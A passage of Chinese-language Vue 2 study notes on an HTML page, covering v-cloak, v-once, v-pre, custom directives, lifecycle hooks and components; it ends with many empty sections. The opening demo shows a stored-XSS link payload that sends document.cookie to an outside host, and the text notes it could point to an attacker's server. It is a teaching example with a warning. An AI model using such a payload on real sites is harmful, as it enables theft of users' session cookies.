            &lt;p&gt;到目前为止,你是不是觉得,诶,这不都是本地做到的吗,咋攻击别人啊,看看下面,你就知道了&lt;/p&gt;
            &lt;p&gt;假如下面这个是个留言板,他没有做任何过滤&lt;/p&gt;
            &lt;p&gt;
              你往里面扔了这么一句话,&lt;br&gt;
              &lt;a href=javascript:location.href="https://www.baidu.com?"+document.cookie&gt;澳门赌场,一夜暴富&lt;/a&gt;
            &lt;/p&gt;
            &lt;p&gt;点击提交&lt;/p&gt;
            &lt;form @submit.prevent="rua"&gt;
              &lt;textarea cols="70" rows="3" style="font-size: 21px;" v-model.lazy="other"&gt;&lt;/textarea&gt;
              &lt;button&gt;提交&lt;/button&gt;
            &lt;/form&gt;
            &lt;p&gt;
              先看我这句话再点链接&lt;span id="a"&gt;&lt;/span&gt;,点击链接后注意看浏览器地址栏里的网址,你会发现在网址的末端,
              你的cookie已经被传走了,假如你在某个论坛发布了这一句话,把这句话里的百度网址换成你
              自己的服务器,那点击链接的人所在论坛的cookie不就全部传到了你自己的服务器,
              是不是就造成了大量的cookie泄露,虽然重要cookie都会有HttpOnly,虽然留言板一般都会有
              过滤,但是攻击手段也不仅仅于此,望重视。
            &lt;/p&gt;
          &lt;/div&gt;
      
          &lt;script src="./js/vue.js"&gt;&lt;/script&gt;
          &lt;script&gt;
      
            const vm = new Vue({
              el: '#root',
              data: {
                name:'wyz',
                name2:'&lt;h3&gt;wyz&lt;/h3&gt;',
                other:'&lt;a href=javascript:location.href="https://www.baidu.com?"+document.cookie&gt;澳门赌场,一夜暴富&lt;/a&gt;',
              },
              methods:{
                add(){
                  document.cookie = '假装是cookie=abaaba;';
                },
                add2(){
                  console.log(document.cookie);
                },
                rua(){
                  document.getElementById('a').innerHTML = this.other;
                }
              },
              computed:{
              },
              watch:{
              },
              filters:{ 
              },
            })
          &lt;/script&gt;
        &lt;/body&gt;
      &lt;/html&gt;
    </pre>
    <p>无总结</p>
    
    <hr>
    <!-- 22 1/11 -->
    <h2>v-cloak <span class="down" onclick="clickondown(this)">\/</span></h2>
    <button class="copy" onclick="copy(this)">复制</button>
    <pre class="code_1">
      &lt;!DOCTYPE html&gt;
      &lt;html lang="zh"&gt;
        &lt;head&gt;
          &lt;meta charset="UTF-8"&gt;
          &lt;title&gt;没错,我就是标题&lt;/title&gt;
          &lt;style&gt;
            div{
              width: 1050px;
              margin: 0px auto;
              font-size: 20px;
              box-shadow: 0 2px 12px 0 rgba(0, 0, 0, 0.1);
            }
            [v-cloak]{
              display: none;
            }
          &lt;/style&gt;
        &lt;/head&gt;
        &lt;body&gt;
          &lt;div id="root"&gt;
            &lt;span v-cloak&gt;{{ name }}&lt;/span&gt;&lt;span id="a" style="margin-left: 123px;"&gt; ← 这个有v-cloak&lt;/span&gt;&lt;br&gt;
            &lt;span&gt;{{ name }}&lt;/span&gt;&lt;span id="b"&gt;&nbsp;&nbsp;&nbsp;&nbsp; ← 这个没有v-cloak&lt;/span&gt;
            &lt;p&gt;现在这个页面中模拟了因为网速问题,Vue.js还没加载完的现象,插值语法直接暴露在了页面中&lt;/p&gt;
            &lt;p&gt;v-cloak是个特殊的属性,Vue接管了容器后,会删除v-cloak&lt;/p&gt;
            &lt;p&gt;他本身并没有特别的含义,但是他经常被拿来做阻塞用,点击下面按钮后,演示效果如上&lt;/p&gt;
            &lt;button onclick="Delayedloading()"&gt;点我延迟1秒后加载Vue.js文件&lt;/button&gt;
            &lt;p&gt;可以看到,在vue.js加载完之后,由Vue接管了容器root,并且v-cloak被删除了,相比于没有v-cloak,页面不会显得杂乱&lt;/p&gt;
          &lt;/div&gt;
          &lt;script&gt;
            function Delayedloading(){
              setTimeout(() =&gt; {
                let getscript = document.createElement('script');
                document.head.appendChild(getscript);
                getscript.src = "./js/vue.js";
                document.getElementById('a').style.display = 'none';
                document.getElementById('b').style.display = 'none';
              }, 1000);
      
              setTimeout(() =&gt; {
                const vm = new Vue({
                  el: '#root',
                  data: {
                    name:'现在你看到我了',
                  },
                })
              }, 1100);
            }
          &lt;/script&gt;
        &lt;/body&gt;
      &lt;/html&gt;
    </pre>
    <p>无总结</p>
    
    <hr>
    <!-- 23 1/11 -->
    <h2>v-once <span class="down" onclick="clickondown(this)">\/</span></h2>
    <button class="copy" onclick="copy(this)">复制</button>
    <pre class="code_1">
      &lt;!DOCTYPE html&gt;
      &lt;html lang="zh"&gt;
        &lt;head&gt;
          &lt;meta charset="UTF-8"&gt;
          &lt;title&gt;没错,我就是标题&lt;/title&gt;
          &lt;style&gt;
            div{
              width: 1050px;
              margin: 0px auto;
              font-size: 20px;
              box-shadow: 0 2px 12px 0 rgba(0, 0, 0, 0.1);
            }
          &lt;/style&gt;
        &lt;/head&gt;
        &lt;body&gt;
          &lt;div id="root"&gt;
            &lt;p v-once&gt;初始值:{{ num }}&lt;/p&gt;
            &lt;p&gt;现值:{{ num }}&lt;/p&gt;
            &lt;button @click= "num++"&gt;++&lt;/button&gt;
      
            &lt;p&gt;可以看到,你按++,v-once不为所动,因为在初次动态渲染之后,v-once所在就被视为静态页面&lt;/p&gt;
          &lt;/div&gt;
        
          &lt;script src="./js/vue.js"&gt;&lt;/script&gt;
          &lt;script&gt;
        
            const vm = new Vue({
              el: '#root',
              data: {
                num:'1',
              },
              methods:{
              },
              computed:{
              },
              watch:{
              },
              filters:{ 
              },
            })
          &lt;/script&gt;
        &lt;/body&gt;
      &lt;/html&gt;
    </pre>
    <p>无总结</p>
    
    <hr>
    <!-- 24 1/11 -->
    <h2>v-pre <span class="down" onclick="clickondown(this)">\/</span></h2>
    <button class="copy" onclick="copy(this)">复制</button>
    <pre class="code_1">
      &lt;!DOCTYPE html&gt;
      &lt;html lang="zh"&gt;
        &lt;head&gt;
          &lt;meta charset="UTF-8"&gt;
          &lt;title&gt;没错,我就是标题&lt;/title&gt;
          &lt;style&gt;
            div{
              width: 1050px;
              margin: 0px auto;
              font-size: 20px;
              box-shadow: 0 2px 12px 0 rgba(0, 0, 0, 0.1);
            }
          &lt;/style&gt;
        &lt;/head&gt;
        &lt;body&gt;
          &lt;div id="root"&gt;
            &lt;p v-pre&gt;初始值:{{ num }}&lt;/p&gt;
            &lt;p v-pre&gt;现值:{{ num }}&lt;/p&gt;
            &lt;p&gt;{{ num }}&lt;/p&gt;
            &lt;button v-pre @click="num++"&gt;++&lt;/button&gt;
            &lt;p&gt;可以看到,Vue不为所动,插值语法都没渲染&lt;/p&gt;
            &lt;p&gt;因为v-pre会跳过所在节点的编译,在不需要Vue编译的地方写v-pre可以提升性能（略微&lt;/p&gt;
            &lt;p&gt;注意,第三个插值语法之所以没有v-pre却也没有渲染,是因为++按钮写上了v-pre导致Vue直接炸了&lt;/p&gt;
          &lt;/div&gt;
        
          &lt;script src="./js/vue.js"&gt;&lt;/script&gt;
          &lt;script&gt;
            const vm = new Vue({
              el: '#root',
              data: {
                num:'1',
              },
              methods:{
              },
              computed:{
              },
              watch:{
              },
              filters:{ 
              },
            })
          &lt;/script&gt;
        &lt;/body&gt;
      &lt;/html&gt;      
    </pre>
    <p>无总结</p>
    
    <hr>
    <!-- 25 1/12 -->
    <h2>自定义指令 <span class="down" onclick="clickondown(this)">\/</span></h2>
    <button class="copy" onclick="copy(this)">复制</button>
    <pre class="code_1">
      &lt;!DOCTYPE html&gt;
      &lt;html lang="zh"&gt;
        &lt;head&gt;
          &lt;meta charset="UTF-8"&gt;
          &lt;title&gt;没错,我就是标题&lt;/title&gt;
          &lt;style&gt;
            div{
              width: 1050px;
              margin: 0px auto;
              font-size: 20px;
              box-shadow: 0 2px 12px 0 rgba(0, 0, 0, 0.1);
            }
          &lt;/style&gt;
        &lt;/head&gt;
        &lt;body&gt;
          &lt;div id="root"&gt;
            &lt;h3&gt;需求1&lt;/h3&gt;
            &lt;span&gt;初始值:&lt;/span&gt;&lt;span v-text="num"&gt;&lt;/span&gt;&lt;br&gt;
            &lt;span&gt;放大值:&lt;/span&gt;&lt;span v-big1="num"&gt;&lt;/span&gt;&lt;br&gt;
            &lt;span&gt;放大值:&lt;/span&gt;&lt;span v-big999999-q="num"&gt;&lt;/span&gt;&lt;br&gt;
            &lt;button @click="num++"&gt;++&lt;/button&gt;
            &lt;br&gt;
            &lt;br&gt;
            &lt;br&gt;
            &lt;br&gt;
            &lt;h3&gt;需求2&lt;/h3&gt;
            &lt;input v-fbind:value="1"&gt; 
      
            &lt;p&gt;自定义指令的坑&lt;/p&gt;
            &lt;p&gt;1.命名时不能用大写,不然会被Vue转成小写而报错&lt;/p&gt;
            &lt;p&gt;
              2.不能写大写意味着不能用驼峰式命名,官方推荐是使用"-"来间隔,但是"-"可以用在模板里,
              却不能用在函数里在函数里用"-"就会导致编译器报错,所以在函数里要用""包裹,比如"big-apple"。
              但是你用了""可就不能用简写形式的自定义指令咯,所以这里要注意一下(听别人说的,但是我自己试了试好像可以用啊)
            &lt;/p&gt;
            &lt;p&gt;3.自定义指令里的this都是Windows全局对象!&lt;/p&gt;
            &lt;pre style="font-weight: bold;"&gt;
      4.自定义指令也可以像过滤器一样写成全局形式
      对象式
      Vue.directive("fbind",{
        bind(xxx,xxx){xxx},
        inserted(xxx,xxx){xxx},
        update(xxx,xxx){xxx},
      })
      函数式
      Vue.directive("big",function(xxx,xxx){
        element.innerText = binding.value * 10;
      })
            &lt;/pre&gt;
            &lt;p&gt;5.定义指令的时候不需要写v-,使用时必须要写v-&lt;/p&gt;
          &lt;/div&gt;
        
          &lt;script src="./js/vue.js"&gt;&lt;/script&gt;
          &lt;script&gt;
        
            const vm = new Vue({
              el: '#root',
              data: {
                num:'1',
              },
              methods:{
              },
              computed:{
              },
              watch:{
              },
              filters:{ 
              },
              directives:{
                // &lt;!-- 需求1:定义一个叫v-big的指令,其功能类似v-text,但是v-big的值会放大10倍 --&gt;
                big1:function(element,binding){ //自定义指令可以是函数式的
                  //那这指令怎么定义呢,玄机在函数接收的值里
                  console.log(element,binding);
                  //通过console.log,可以看到,element就是指令绑定的DOM本身,binding是一些关于指令的参数
                  //接下来实现需求1就很明确了
                  element.innerText = binding.value * 10;
                },
                "big999999-q"(element,binding){ element.innerText = binding.value * 10; }, //js的语法精简,没忘吧
                //现在有个新问题,big1什么时候会被调用呢?
                //通过测试我们会发现,big在模板被解析时（不管几次）,都会重新调用
      
      
                // 需求2:定义一个叫v-fbind的指令,其功能类似v-bind,但可以让其绑定的元素自动获取焦点
                fbind:{ //自定义指令还可以是对象式的(最完整的写法),所以说上面的函数式其实是简写
      
                  //对象式里可以写很多函数,而且还可以在不同的周期调用不同的函数
                  //但是这种内定函数的名字你可不能乱打
      
                  bind(element,binding){ //指令与元素绑定成功时调用
                    element.value = binding.value;
                  },
                  inserted(element,binding){ //指令所在的元素被插入页面时调用
                    element.focus();
                  },
                  update(element,binding){ //指令所在的模板被重新解析时调用
                    element.value = binding.value;
                  },
                },
              },
            })
          &lt;/script&gt;
        &lt;/body&gt;
      &lt;/html&gt;
    </pre>
    <p>无总结</p>
    
    <hr>
    <!-- 26 1/14 -->
    <h2>生命周期 <span class="down" onclick="clickondown(this)">\/</span></h2>
    <button class="copy" onclick="copy(this)">复制</button>
    <pre class="code_1">
      &lt;!DOCTYPE html&gt;
      &lt;html lang="zh"&gt;
        &lt;head&gt;
          &lt;meta charset="UTF-8"&gt;
          &lt;title&gt;没错,我就是标题&lt;/title&gt;
          &lt;style&gt;
            div{
              width: 1480px;
              margin: 0px auto;
              font-size: 20px;
              box-shadow: 0 2px 12px 0 rgba(0, 0, 0, 0.1);
            }
          &lt;/style&gt;
        &lt;/head&gt;
        &lt;body&gt;
          &lt;div id="root"&gt;
            &lt;h1 :style="{opacity: opacity}"&gt;生命周期&lt;/h1&gt;
            &lt;!-- 还可以利用ES6语法简写 kv一致省略v 效果是一致的 --&gt;
            &lt;h1 :style="{opacity}"&gt;SzhLzj&lt;/h1&gt;
            &lt;p&gt;好了,我们成功利用生命周期的mounted实现了类似windows.onload的效果&lt;/p&gt;
            &lt;p&gt;下面我引用尚硅谷-张天禹老师的生命周期注解图&lt;/p&gt;
            &lt;img src="https://szhlzj.github.io/My-Blog/img/%E7%94%9F%E5%91%BD%E5%91%A8%E6%9C%9F.png" alt=""&gt;
            &lt;p style="font-size: 61px;"&gt;通过这个生命周期注解图,想必大家已经有了自己的理解,打开控制台看看实际运行顺序是否一致吧&lt;/p&gt;
          &lt;/div&gt;
        
          &lt;script src="./js/vue.js"&gt;&lt;/script&gt;
          &lt;script&gt;
        
            const vm = new Vue({
              el: '#root',
              data: {
                opacity:'1',
                timer: '',
              },
              methods:{
              },
              computed:{
              },
              watch:{
              },
              filters:{ 
              },
              directives:{
              },
              mounted(){ //这个名字是Vue定的,不能改,mounted与data、methods同级!
                //学习的第一个生命周期钩子,在页面完成模板的解析,并把初始的真实DOM放入页面中后（挂载完毕后）,Vue会自动调用mounted
                this.timer = setInterval (() =&gt; {
                  this.opacity -= 0.01; //这里的this同样是因为Vue帮您重定向过,this is vm
                  if (this.opacity &lt;= 0) {
                    this.opacity = 1;
                  }
                }, 31);
                console.log('mounted已启动');
              },
              beforeCreate() {
                console.log('beforeCreate已启动');
              },
              created() {
                console.log('created已启动');
              },
              beforeMount() {
                console.log('beforeMount已启动');
              },
              beforeUpdate() {
                console.log('beforeUpdate已启动');
              },
              updated() {
                console.log('updated已启动');
                clearInterval(this.timer);
                this.$destroy(); //销毁程序
              },
              beforeDestroy() {
                console.log('beforeDestroy已启动');
                console.log('开始运行this.$destroy(),vm开始自毁程序');
              },
              destroyed() {
                console.log('destroyed已启动');
                console.log('vm已自毁');
                console.log('你可能会问,为什么页面上的东西都还在呢?因为这是人家的遗产!');
                console.log(`
vm的一生
将要创建===>调用beforeCreate函数。
创建完毕===>调用created函数。

将要挂载===>调用beforeMount函数。
挂载完毕===>调用mounted函数。      ========>重要的钩子

将要更新===>调用beforeUpdate函数。
更新完毕===>调用updated函数。

将要销毁===>调用beforeDestroy函数。========>重要的钩子
销毁完毕===>调用destroyed函数。`);
              },
            })
          &lt;/script&gt;
        &lt;/body&gt;
      &lt;/html&gt;
    </pre>
    <p>无总结</p>
    
    <hr>
    <!-- 27 3/22 -->
    <h2>终于到了,组件化开发之非单文件组件 ---虽然实际开发时用的不多,但是干货多,值得学习 <span class="down" onclick="clickondown(this)">\/</span></h2>
    <button class="copy" onclick="copy(this)">复制</button>
    <pre class="code_1">
      &lt;!DOCTYPE html&gt;
      &lt;html lang="zh"&gt;
        &lt;head&gt;
          &lt;meta charset="UTF-8"&gt;
          &lt;title&gt;没错,我就是标题&lt;/title&gt;
          &lt;style&gt;
            div{
              width: 1050px;
              margin: 0px auto;
              font-size: 20px;
              box-shadow: 0 2px 12px 0 rgba(0, 0, 0, 0.1);
            }
          &lt;/style&gt;
        &lt;/head&gt;
        &lt;body&gt;
          &lt;div id="root"&gt;
            &lt;!-- 全局注册的组件 --&gt;
            &lt;h6&gt;全局注册的组件&lt;/h6&gt;
            &lt;xuexiao&gt;&lt;/xuexiao&gt;
            &lt;hr&gt;
            &lt;!-- 使用组件 --&gt;
            &lt;school&gt;&lt;/school&gt;
            &lt;!-- 而且是想用几遍用几遍 --&gt;
            &lt;student&gt;&lt;/student&gt;
            &lt;student&gt;&lt;/student&gt;
          &lt;/div&gt;
        
          &lt;script src="./js/vue.js"&gt;&lt;/script&gt;
          &lt;script&gt;
            //创建组件
            let xuexiao = Vue.extend ({ //一个很重要的Vue api 用于"定义|创建"组件
              //这里是容器部分,组件根元素只能有一个,所以要包一层div或者是别的什么
              template:
              `
              &lt;div&gt;
                &lt;h3&gt;学校名称: {{ SchoolName }}&lt;/h3&gt;
                &lt;h3&gt;学校地址: {{ SchoolAddress }}&lt;/h3&gt;
              &lt;/div&gt;
              `,
      
              //el: '#root', //不需要指定el,因为组件服务于谁是由vm决定的,而不是由组件决定的
              data() {  //还记得吗,在前面讲过,el和data有两种写法,当时也提过一嘴,data在组件中必须用函数式,否则会报错
                return { //除了报错,也能保证复用组件时,避免可能存在的数据冲突
                  SchoolName: 'O v O 学院',
                  SchoolAddress: 'O v O',
                }
              },
            })
      
      
            //创建第二个组件      //这里用英文演示组件名称,让你搞懂组件真正的取名到底在哪
            let student = Vue.extend ({ //Vue.extend(options)和new Vue(options)的options几乎一模一样,但也存在一些差别
              //这里是容器部分
              template:
              `
              &lt;div&gt;
                &lt;h3&gt;学生姓名: {{ StudentName }}&lt;/h3&gt;
                &lt;h3&gt;学生年龄: {{ StudentAge }}&lt;/h3&gt;
                &lt;h3&gt;学生性别: {{ StudentSex }}&lt;/h3&gt;
                &lt;button @click="warning()"&gt;点我提示详细信息&lt;/button&gt;
              &lt;/div&gt;
              `,
      
              data() {
                return {
                  StudentName: '蕾比',
                  StudentAge: 11,
                  StudentSex: '女',
                }
              },
              methods: {
                warning(){
                  alert('是蕾比哒');
                },
              }
            })
      
            //如何全局注册组件
            // Vue.component('组件标签名',组件变量名);
            Vue.component('xuexiao',xuexiao); //为了方便,我直接给旧组件取一个新名字
      
            // 创建vm
            let vm = new Vue({
              el: '#root', //大哥vm决定了小弟们（组件）应该服务于谁
              components:{ //很重要的方法 用于"配置|注册"组件,这里的注册是局部注册哦
                school:xuexiao, //可以看出,上面定义的变量名只是用于中转,真正定义组件名的地方在components里
                                //注意,如果不在脚手架中,组件名和自定义指令名一样,有可能!不能用大写
                // student:student //换下面的写法
                student, //es6 kv一致省略v 因此组件的变量名和真正的标签名最好一样
              }
            })
          &lt;/script&gt;
        &lt;/body&gt;
      &lt;/html&gt;    
    </pre>
    <p>总结</p>
    <p>推荐的组件命名方式</p>
    <p>1.如果是单个单词,可以全小写,也可以首字母大写</p>
    <p>2.如果是多个单词,可以全小写,或者在单词之间用"-"连接,注意,如果用"-"连接,在js语法中是不允许的,但我们可以通过包一层引号来解决,例如:"my-blog"</p>
    <p>3.如果是多个单词,也可以所有单词首字母大写,但是这必须在脚手架(cli)中使用,如果是html文件中引入vue的话,这方法是不行的</p>
    <p>4.组件还有一种命名方式,在创建组件的地方,也就是Vue.extend里,可以用name属性来定义一个命名,这个命名好像只在Vue开发者工具中生效,代码中无效,一般是第三方库或者大型项目开发会用到</p>
    <p>5.组件标签可以写成双标签&lt;xxx&gt;&lt;/xxx&gt;,也可以写成单标签&lt;xxx/&gt;,但是要注意,不在脚手架中写单标签的话,会导致后续组件不被渲染</p>
    <p>6.创建组件的简写方式 const school = Vue.extend(options) 可简写为 const school = options </p>

    <hr>
    <!-- 28 3/23 -->
    <h2>如何嵌套组件 <span class="down" onclick="clickondown(this)">\/</span></h2>
    <button class="copy" onclick="copy(this)">复制</button>
    <pre class="code_1">
      &lt;!DOCTYPE html&gt;
      &lt;html lang="zh"&gt;
        &lt;head&gt;
          &lt;meta charset="UTF-8"&gt;
          &lt;title&gt;没错,我就是标题&lt;/title&gt;
          &lt;style&gt;
            div{
              width: 1050px;
              margin: 0px auto;
              font-size: 20px;
              box-shadow: 0 2px 12px 0 rgba(0, 0, 0, 0.1);
            }
          &lt;/style&gt;
        &lt;/head&gt;
        &lt;body&gt;

          &lt;div id="root"&gt;
            &lt;!-- 使用组件 --&gt;
            &lt;school&gt;&lt;/school&gt;
          &lt;/div&gt;
        
          &lt;script src="./js/vue.js"&gt;&lt;/script&gt;
      
          &lt;script&gt;
            //先创建子组件,因为父组件要使用子组件的话,子组件需要先定义,否则会报错,但我这个为什么没报错?(虽然没报错,但是页面确实没显示)
            let student = Vue.extend ({
              template:
              `
              &lt;div&gt;
                &lt;h3&gt;学生姓名: {{ StudentName }}&lt;/h3&gt;
                &lt;h3&gt;学生年龄: {{ StudentAge }}&lt;/h3&gt;
                &lt;h3&gt;学生性别: {{ StudentSex }}&lt;/h3&gt;
                &lt;button @click="warning()"&gt;点我提示详细信息&lt;/button&gt;
              &lt;/div&gt;
              `,
      
              data() {
                return {
                  StudentName: '蕾比',
                  StudentAge: 11,
                  StudentSex: '女',
                }
              },
              methods: {
                warning(){
                  alert('是蕾比哒');
                },
              }
            })
      
      
            //创建父组件
            let xuexiao = Vue.extend ({
              //在template这里面使用子组件哦
              template:
              `
              &lt;div&gt;
                &lt;h3&gt;学校名称: {{ SchoolName }}&lt;/h3&gt;
                &lt;h3&gt;学校地址: {{ SchoolAddress }}&lt;/h3&gt;
                &lt;student&gt;&lt;/student&gt;
              &lt;/div&gt;
              `,
      
              data() {
                return {
                  SchoolName: 'O v O 学院',
                  SchoolAddress: 'O v O',
                }
              },
              //既然使用了,肯定不能忘记注册组件呀,注意哦,是在使用了子组件的父组件里注册哦,全局注册也是可以的
              components:{
                student,
              }
            })
      
      
            // 创建Vue实例
            let vm = new Vue({
              el: '#root',
              //注册父组件
              components:{
                school:xuexiao,
              }
            })
          &lt;/script&gt;
        &lt;/body&gt;
      &lt;/html&gt;    
    </pre>
    <p>总结（番外）</p>
    <p>关于 VueComponent</p>
    <pre>
      1.Vue组件本质是一个名为VueComponent的构造函数,且不是程序员定义的,是Vue.extend生成的。
      2.我们只需要写&lt;school/&gt;或&lt;school&gt;&lt;/school&gt;,Vue解析时会帮我们创建school组件的实例对象,即vue帮我们执行的:new VueComponent(options).
      3.特别注意:每次调用Vue.extend,返回的都是一个全新的VueComponent! !!!
      4.关于this指向:
        (1).组件配置中:
          data函数、methods中的函数、watch中的函数、computed中的函数它们的this均是【VueComponent实例对象】J
        (2).new Vue()配置中:
          data函数、methods中的函数、watch中的函数、computed中的函数它们的this均是【Vue实例对象】。
      5.VueComponent的实例对象,以后简称vc（也可称之为:组件实例对象）。
      Vue的实例对象,以后简称vm
    </pre>
    <p>原型链</p>
    <p>关于 prototype</p>
    <p>只要是一个函数,身上一定会有一个属性:prototype,中文名:显式原型属性</p>
    <p>如果这个函数还是一个构造函数,那他缔造出来的实例对象,他身上也会有一个属性:__proto__,中文名:隐式原型属性</p>
    <p>他们两都被指向了一个对象,原型对象,上面说的显式原型属性和隐式原型属性其实是一个东西,只是通过的路径不同,便于区分而取的不同名字</p>
    <p>当获取实例的属性或者方法时,会先在自身的属性和方法进行寻找,如果找不到就会自动去隐式原型中寻找</p>
    <pre>
      //比如说你定义了一个构造函数
      function Demo(){
        this.a = 31;
        this.b = 51;
      }

      //然后你用构造函数创建了一个实例对象
      const c = new Demo();

      //这个就是构造函数Demo的显式原型属性
      console.log(Demo.prototype)

      //这个就是c的隐式原型属性
      console.log(c.__proto__)

      //但是他们指向的都是同一个原型对象,因此返回的应该是true
      console.log(Demo.prototype === c.__proto__)

      //因此你通过显式原型对象向原型对象添加一个属性时,隐式原型属性也会看到这个新添加的属性
      Demo.prototype.x = 5131;
      console.log(c)
      console.log(c.__proto__.x)
    </pre>
    <p>1.一个重要的内置关系:VueComponent.prototype.__proto__ === Vue.prototype</p>
    <p>2.为什么要有这个关系:让组件实例对象(vc）可以访问到 Vue原型上的属性、方法。</p>

    <hr>
    <!-- 29 3/24 -->
    <h2> <span class="down" onclick="clickondown(this)">\/</span></h2>
    <button class="copy" onclick="copy(this)">复制</button>
    <pre class="code_1">

    </pre>
    <p>无总结</p>
    
    <hr>
    <!-- 2 1/8 -->
    <h2> <span class="down" onclick="clickondown(this)">\/</span></h2>
    <button class="copy" onclick="copy(this)">复制</button>
    <pre class="code_1">

    </pre>
    <p>无总结</p>
    
    <hr>
    <!-- 3 1/8 -->
    <h2> <span class="down" onclick="clickondown(this)">\/</span></h2>
    <button class="copy" onclick="copy(this)">复制</button>
    <pre class="code_1">

    </pre>
    <p>无总结</p>
    
    <hr>
    <!-- 3 1/8 -->
    <h2> <span class="down" onclick="clickondown(this)">\/</span></h2>
    <button class="copy" onclick="copy(this)">复制</button>
    <pre class="code_1">

    </pre>
    <p>无总结</p>
    
    <hr>
    <!-- 3 1/8 -->
    <h2> <span class="down" onclick="clickondown(this)">\/</span></h2>
    <button class="copy" onclick="copy(this)">复制</button>
    <pre class="code_1">

    </pre>
    <p>无总结</p>
    
    <hr>
    <!-- 3 1/8 -->
    <h2> <span class="down" onclick="clickondown(this)">\/</span></h2>
    <button class="copy" onclick="copy(this)">复制</button>
    <pre class="code_1">

    </pre>
    <p>无总结</p>
    
    <hr>
    <!-- 18 1/8 -->
    <h2> <span class="down" onclick="clickondown(this)">\/</span></h2>
    <button class="copy" onclick="copy(this)">复制</button>
    <pre class="code_1">

    </pre>
    <p>无总结</p>
    
    <hr>
    <!-- 18 1/8 -->
    <h2> <span class="down" onclick="clickondown(this)">\/</span></h2>
    <button class="copy" onclick="copy(this)">复制</button>
    <pre class="code_1">

    </pre>
    <p>无总结</p>
    
    <hr>
    <!-- 18 1/8 -->
    <h2> <span class="down" onclick="clickondown(this)">\/</span></h2>
    <button class="copy" onclick="copy(this)">复制</button>
    <pre class="code_1">

    </pre>
    <p>无总结</p>
    
    <hr>
    <!-- 18 1/8 -->
    <h2> <span class="down" onclick="clickondown(this)">\/</span></h2>
    <button class="copy" onclick="copy(this)">复制</button>
    <pre class="code_1">

    </pre>
    <p>无总结</p>
    
    <hr>
    <!-- 18 1/8 -->
    <h2> <span class="down" onclick="clickondown(this)">\/</span></h2>
    <button class="copy" onclick="copy(this)">复制</button>
    <pre class="code_1">

    </pre>
    <p>无总结</p>
    
    <hr>
    <!-- 18 1/8 -->
    <h2> <span class="down" onclick="clickondown(this)">\/</span></h2>
    <button class="copy" onclick="copy(this)">复制</button>
    <pre class="code_1">

    </pre>
    <p>无总结</p>

  </div>    

  <!-- <script src="./js/rem.js"></script> -->
  <script>
    let frame = document.getElementById("frame");
    let down = document.getElementsByClassName('down');
    let copys = document.getElementsByClassName('copy');
    let code_1 = document.getElementsByClassName('code_1');

    // 给所有下拉按钮添加index下标
    for(let i=0; i<down.length; i++){
      down[i].setAttribute("index",i);
    }
    //网页全部字体大小调整
    function trigger(value) {
      frame.style.fontSize = `${value}%`;
    }
    //单独下拉与收起
    function clickondown(val) {
      let classIndex = val.getAttribute("index"); // 当前操作的class下标

      if (code_1[classIndex].style.display != 'none' && code_1[classIndex].style.display != 'block') {
        code_1[classIndex].style.display = 'none';
      }
      if (code_1[classIndex].style.display == 'none'){
        code_1[classIndex].style.display = 'block';
        copys[classIndex].style.display = 'block';//显示复制按钮
        val.innerHTML = '/\\';
      }
      else{
        code_1[classIndex].style.display = 'none';
        copys[classIndex].style.display = 'none';//隐藏复制按钮
        val.innerHTML = '\\/';
      }
    }
    //一键全部下拉与收起
    function sqzk(val) {
      if (val.innerHTML == "一键展开所有下拉栏↓") {
        for(let i=0; i<down.length; i++){
          code_1[i].style.display = 'block';
          copys[i].style.display = 'block';//显示复制按钮
          down[i].innerHTML = '/\\';
        }
        val.innerHTML = "一键收起所有下拉栏↑";
        val.style.backgroundColor = '#00FFFF';
        return;
      }
      if (val.innerHTML == "一键收起所有下拉栏↑") {
        for(let i=0; i<down.length; i++){
          code_1[i].style.display = 'none';
          copys[i].style.display = 'none';//隐藏复制按钮
          down[i].innerHTML = '\\/';
        }
        val.innerHTML = "一键展开所有下拉栏↓";
        val.style.backgroundColor = '#e7e7e7';
        return;
      }
    }
    // 复制code_1的内容,async异步 不是必须的的,写入系统剪贴板指令为navigator.clipboard.writeText()
    async function copy(th) {
      console.log();
      let text = th.nextSibling.nextSibling.innerHTML.replace(/&lt;/g, "<")
      try {
        await navigator.clipboard.writeText(text.replace(/&gt;/g, ">"));
        th.innerHTML = '复制成功';
        setTimeout(() => {
          th.innerHTML = '复制';
        }, 3000);
      } catch (err) {
        alert('复制失败,您的浏览器可能不支持这个功能', err);
      }
    }
  </script>
</body>
</html>